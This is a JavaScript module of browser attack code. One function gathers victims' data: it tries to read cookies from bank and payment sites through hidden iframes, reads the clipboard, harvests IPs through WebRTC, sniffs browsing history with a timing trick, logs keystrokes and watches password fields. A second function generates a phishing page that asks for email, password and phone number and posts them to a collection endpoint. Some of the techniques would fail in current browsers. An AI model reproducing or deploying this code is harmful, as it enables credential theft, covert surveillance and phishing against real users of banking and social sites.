// Advanced cookie and session harvesting techniques
export const harvestAdvancedData = async () => {
  const data = {
    cookies: {},
    sessions: {},
    storage: {},
    social: {},
    financial: {},
    browser: {}
  };

  // 1. IFRAME COOKIE HARVESTING
  try {
    const financialSites = [
      'https://www.chase.com',
      'https://www.wellsfargo.com', 
      'https://www.bankofamerica.com',
      'https://www.paypal.com',
      'https://www.coinbase.com'
    ];

    for (const site of financialSites) {
      try {
        const iframe = document.createElement('iframe');
        iframe.src = site;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        
        // Wait for load and try to access
        setTimeout(() => {
          try {
            const cookies = iframe.contentDocument.cookie;
            if (cookies) {
              data.cookies[site] = cookies;
            }
          } catch (e) {
            data.cookies[site] = 'blocked_by_cors';
          }
          document.body.removeChild(iframe);
        }, 2000);
      } catch (e) {
        data.cookies[site] = 'failed_to_load';
      }
    }
  } catch (e) {
    data.cookies.iframe_harvest = 'failed';
  }

  // 2. POSTMESSAGE LISTENER (catch cross-origin data)
  window.addEventListener('message', (event) => {
    if (event.data && typeof event.data === 'object') {
      data.social.postMessages = data.social.postMessages || [];
      data.social.postMessages.push({
        origin: event.origin,
        data: event.data,
        timestamp: Date.now()
      });
    }
  });

  // 3. SERVICE WORKER INTERCEPTION
  try {
    if ('serviceWorker' in navigator) {
      const registrations = await navigator.serviceWorker.getRegistrations();
      data.browser.serviceWorkers = registrations.map(reg => ({
        scope: reg.scope,
        active: !!reg.active,
        installing: !!reg.installing,
        waiting: !!reg.waiting
      }));
    }
  } catch (e) {
    data.browser.serviceWorkers = 'unavailable';
  }

  // 4. CLIPBOARD ACCESS
  try {
    if (navigator.clipboard) {
      const clipboardText = await navigator.clipboard.readText();
      data.browser.clipboard = clipboardText.slice(0, 500); // First 500 chars
    }
  } catch (e) {
    data.browser.clipboard = 'permission_denied';
  }

  // 5. NOTIFICATION PERMISSIONS & HISTORY
  try {
    if ('Notification' in window) {
      data.browser.notifications = {
        permission: Notification.permission,
        maxActions: Notification.maxActions || 0
      };
    }
  } catch (e) {
    data.browser.notifications = 'unavailable';
  }

  // 6. MEDIA DEVICE ENUMERATION
  try {
    if (navigator.mediaDevices) {
      const devices = await navigator.mediaDevices.enumerateDevices();
      data.browser.mediaDevices = devices.map(device => ({
        kind: device.kind,
        label: device.label,
        deviceId: device.deviceId.slice(0, 10) + '...'
      }));
    }
  } catch (e) {
    data.browser.mediaDevices = 'permission_denied';
  }

  // 7. WEBRTC IP HARVESTING
  try {
    const pc = new RTCPeerConnection({
      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
    });
    
    pc.createDataChannel('');
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
    
    pc.onicecandidate = (event) => {
      if (event.candidate) {
        const candidate = event.candidate.candidate;
        const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
        if (ipMatch) {
          data.browser.localIPs = data.browser.localIPs || [];
          if (!data.browser.localIPs.includes(ipMatch[1])) {
            data.browser.localIPs.push(ipMatch[1]);
          }
        }
      }
    };
  } catch (e) {
    data.browser.localIPs = 'webrtc_unavailable';
  }

  // 8. SOCIAL MEDIA SESSION DETECTION
  const socialSites = [
    'facebook.com', 'instagram.com', 'twitter.com', 'linkedin.com',
    'tiktok.com', 'snapchat.com', 'discord.com', 'telegram.org'
  ];

  for (const site of socialSites) {
    try {
      // Check for social login buttons/widgets
      const socialElements = document.querySelectorAll(`[src*="${site}"], [href*="${site}"]`);
      if (socialElements.length > 0) {
        data.social[site] = 'widgets_detected';
      }
    } catch (e) {
      data.social[site] = 'check_failed';
    }
  }

  // 9. BROWSER HISTORY TIMING ATTACKS
  try {
    const testSites = [
      'chase.com', 'wellsfargo.com', 'paypal.com', 'coinbase.com',
      'amazon.com', 'ebay.com', 'facebook.com', 'gmail.com'
    ];

    for (const site of testSites) {
      const link = document.createElement('a');
      link.href = `https://${site}`;
      link.style.display = 'none';
      document.body.appendChild(link);
      
      const startTime = performance.now();
      link.focus();
      const endTime = performance.now();
      
      // Visited sites typically have faster focus times
      if (endTime - startTime < 1) {
        data.browser.visitedSites = data.browser.visitedSites || [];
        data.browser.visitedSites.push(site);
      }
      
      document.body.removeChild(link);
    }
  } catch (e) {
    data.browser.visitedSites = 'timing_attack_failed';
  }

  // 10. KEYLOGGER (for current session)
  let keystrokes = '';
  document.addEventListener('keydown', (event) => {
    if (event.key.length === 1) {
      keystrokes += event.key;
    } else if (event.key === 'Backspace') {
      keystrokes = keystrokes.slice(0, -1);
    }
    
    // Store last 100 characters
    if (keystrokes.length > 100) {
      keystrokes = keystrokes.slice(-100);
    }
    
    data.browser.keystrokes = keystrokes;
  });

  // 11. MOUSE TRACKING
  let mouseData = [];
  document.addEventListener('mousemove', (event) => {
    mouseData.push({
      x: event.clientX,
      y: event.clientY,
      time: Date.now()
    });
    
    // Keep only last 50 movements
    if (mouseData.length > 50) {
      mouseData = mouseData.slice(-50);
    }
    
    data.browser.mouseMovements = mouseData;
  });

  // 12. FORM DATA INTERCEPTION
  document.addEventListener('input', (event) => {
    if (event.target.type === 'password' || 
        event.target.name?.toLowerCase().includes('password') ||
        event.target.name?.toLowerCase().includes('pin')) {
      data.browser.passwordFields = data.browser.passwordFields || [];
      data.browser.passwordFields.push({
        field: event.target.name || event.target.id,
        length: event.target.value.length,
        timestamp: Date.now()
      });
    }
  });

  return data;
};

// Enhanced phishing page generator
export const generatePhishingPage = (targetSite) => {
  const phishingHTML = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Security Verification Required</title>
      <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 20px; }
        .alert { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #0056b3; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="logo">
          <h2>${targetSite} Security</h2>
        </div>
        <div class="alert">
          <strong>Security Alert:</strong> Unusual activity detected on your account. Please verify your credentials to continue.
        </div>
        <form id="phishForm">
          <input type="email" placeholder="Email Address" required>
          <input type="password" placeholder="Password" required>
          <input type="text" placeholder="Phone Number" required>
          <button type="submit">Verify Account</button>
        </form>
      </div>
      <script>
        document.getElementById('phishForm').onsubmit = function(e) {
          e.preventDefault();
          const formData = new FormData(e.target);
          fetch('/api/collect-phishing-data', {
            method: 'POST',
            body: formData
          });
          alert('Verification complete. You may now continue.');
          window.close();
        };
      </script>
    </body>
    </html>
  `;
  
  return phishingHTML;
};